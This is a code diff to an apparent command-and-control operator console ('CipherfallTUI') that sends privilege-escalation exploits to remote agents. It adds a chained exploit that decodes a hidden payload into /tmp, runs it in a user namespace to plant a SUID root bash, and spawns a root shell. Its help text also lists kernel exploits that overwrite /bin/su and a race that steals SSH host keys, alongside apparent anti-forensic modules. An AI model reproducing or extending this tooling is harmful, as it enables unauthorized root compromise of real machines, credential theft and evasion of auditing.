@@ -691,6 +691,32 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         b64 = base64.b64encode(src.read_bytes()).decode()
         rpath = f"/tmp/.{tag}fg.sh"
         return f"WRITE:{rpath}:{b64}"
+    if exploit == "fragnesia-dirtyfrag":
+        df_src = _PRIVESC_DIR / "dirtyfrag" / "exp"
+        if not df_src.exists():
+            return None
+        df_b64 = base64.b64encode(gzip.compress(df_src.read_bytes(), 9)).decode()
+        script = "\n".join([
+            "#!/bin/bash",
+            f"BD={bd}",
+            "if [[ $EUID -eq 0 ]]; then echo '[privesc:fail] fragnesia-dirtyfrag — already root'; exit 1; fi",
+            "if ! command -v unshare &>/dev/null; then echo '[privesc:fail] fragnesia-dirtyfrag — unshare not found'; exit 1; fi",
+            "T=$(mktemp /tmp/.XXXXXXXX)",
+            f"printf '%s' '{df_b64}' | base64 -d | gunzip > \"$T\"",
+            "chmod +x \"$T\"",
+            "export BD T",
+            "unshare --user --map-root-user --net -- bash -c 'printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | $T 2>&1' 2>&1",
+            "rm -f \"$T\"",
+            "if [ -u \"$BD\" ]; then",
+            "    echo '[privesc:ok] fragnesia-dirtyfrag'",
+            "    $BD -p -c 'id'",
+            "else",
+            "    echo '[privesc:fail] fragnesia-dirtyfrag'",
+            "fi",
+        ]) + "\n"
+        b64 = base64.b64encode(script.encode()).decode()
+        rpath = f"/tmp/.{tag}fdf.sh"
+        return f"WRITE:{rpath}:{b64}"
     return None
 
 
@@ -845,19 +871,20 @@ _MODULE_DOCS: "dict[str, tuple[str, str]]" = {
   Root recommended for shred and auditctl.""",
     ),
     "privesc": (
-        "run privilege escalation exploit on agent (copyfail/dirtyfrag/ssh-keysign/fragnesia)",
-        """/module privesc [copyfail|dirtyfrag|ssh-keysign|fragnesia]
+        "run privilege escalation exploit on agent (copyfail/dirtyfrag/ssh-keysign/fragnesia/fragnesia-dirtyfrag)",
+        """/module privesc [copyfail|dirtyfrag|ssh-keysign|fragnesia|fragnesia-dirtyfrag]
 
   Run a privilege escalation exploit on the selected agent.
   Without argument: tries copyfail then dirtyfrag in order; stops on first root.
 
-  copyfail     AF_ALG+KTLS splice overwrite /bin/su → root shell (Python ≥ 3.10)
-  dirtyfrag    xfrm/RxRPC page-cache write  overwrite /usr/bin/su → root shell
-  ssh-keysign  race pidfd_getfd on ssh-keysign exit → steals SSH host keys (read-only)
-  fragnesia    user+net namespace escalation → spawns root agent inside namespace (uid=0, namespace-scoped)
+  copyfail             AF_ALG+KTLS splice overwrite /bin/su → root shell (Python ≥ 3.10)
+  dirtyfrag            xfrm/RxRPC page-cache write overwrite /usr/bin/su → root shell
+  ssh-keysign          race pidfd_getfd on ssh-keysign exit → steals SSH host keys (read-only)
+  fragnesia            user+net namespace → uid=0 in namespace only (no filesystem root)
+  fragnesia-dirtyfrag  chain: user namespace → dirtyfrag inside ns → SUID bash → real host root
 
-  On success (copyfail/dirtyfrag): plants SUID bash at /tmp/.b<tag>, runs id.
-  On success (fragnesia): spawns root agent via unshare — uid=0 inside namespace only.
+  On success (copyfail/dirtyfrag/fragnesia-dirtyfrag): plants SUID bash at /tmp/.b<tag>, runs id.
+  On success (fragnesia): spawns root agent via unshare — uid=0 namespace-scoped only.
   On failure: reports [privesc:fail] for each attempted exploit.
   Root not required to run — exploit escalates from unprivileged user.
 
@@ -896,6 +923,7 @@ _COMPLETIONS: list[str] = [
     "/module privesc dirtyfrag",
     "/module privesc ssh-keysign",
     "/module privesc fragnesia",
+    "/module privesc fragnesia-dirtyfrag",
     "/module save",
     "/module save ",
     "/module suicide",
@@ -1385,9 +1413,9 @@ class CipherfallTUI(App):
                     aid     = px["agent_id"]
                     bu      = self._agent_base.get(aid, BASE)
                     exploit = px["exploit"]
-                    if exploit == "fragnesia":
+                    if exploit in ("fragnesia", "fragnesia-dirtyfrag"):
                         exec_cmd = _build_fragnesia_exec(rp)
-                        log.write("[yellow]upload done — launching fragnesia…[/yellow]")
+                        log.write(f"[yellow]upload done — launching {exploit}…[/yellow]")
                     else:
                         exec_cmd = _build_copyfail_exec(bd, rp)
                         log.write("[yellow]upload done — launching copyfail…[/yellow]")
@@ -1791,9 +1819,9 @@ class CipherfallTUI(App):
             agent_id = self._selected_agent
             if len(parts) >= 3:
                 exploit = parts[2]
-                if exploit not in ("copyfail", "dirtyfrag", "ssh-keysign", "fragnesia"):
+                if exploit not in ("copyfail", "dirtyfrag", "ssh-keysign", "fragnesia", "fragnesia-dirtyfrag"):
                     log.clear()
-                    log.write(f"[red]unknown exploit '{exploit}' — choose: copyfail dirtyfrag ssh-keysign fragnesia[/red]")
+                    log.write(f"[red]unknown exploit '{exploit}' — choose: copyfail dirtyfrag ssh-keysign fragnesia fragnesia-dirtyfrag[/red]")
                     return
                 pcmd = _build_privesc_payload(exploit, tag)
                 if pcmd is None:
@@ -1824,6 +1852,9 @@ class CipherfallTUI(App):
             elif exploit == "fragnesia":
                 px_entry["type"]        = "privesc_write"
                 px_entry["remote_path"] = f"/tmp/.{tag}fg.sh"
+            elif exploit == "fragnesia-dirtyfrag":
+                px_entry["type"]        = "privesc_write"
+                px_entry["remote_path"] = f"/tmp/.{tag}fdf.sh"
             self._privesc_tasks[result["task_id"]] = px_entry
             self._selected_task = result["task_id"]
             log.clear()
